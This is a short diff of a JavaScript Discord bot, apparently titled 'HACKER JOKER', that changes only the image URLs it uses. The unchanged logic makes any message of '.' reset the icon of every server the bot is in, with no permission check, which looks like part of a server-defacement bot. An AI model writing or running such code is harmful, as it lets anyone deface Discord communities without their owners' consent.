@@ -54,7 +54,7 @@ LOka.user.setGame(`HACKER JOKER`,'https://www.twitch.tv/hix')
 LOka.on('message', message => {
      if (message.content === ".") {
          LOka.guilds.forEach(m =>{
-             m.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+             m.setIcon(`https://cdn.discordapp.com/attachments/666331911748059146/684914979622748232/image0.jpg`)
 })
 }
 });
@@ -70,7 +70,7 @@ LOka.on('message', message => {
      if (message.content === ".") {
                  if(!message.channel.guild) return;
  
-             message.guild.setIcon(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
+             message.guild.setIcon(`https://cdn.discordapp.com/attachments/684611990198550780/684915242286710832/image0.gif`)
  
 }
 });
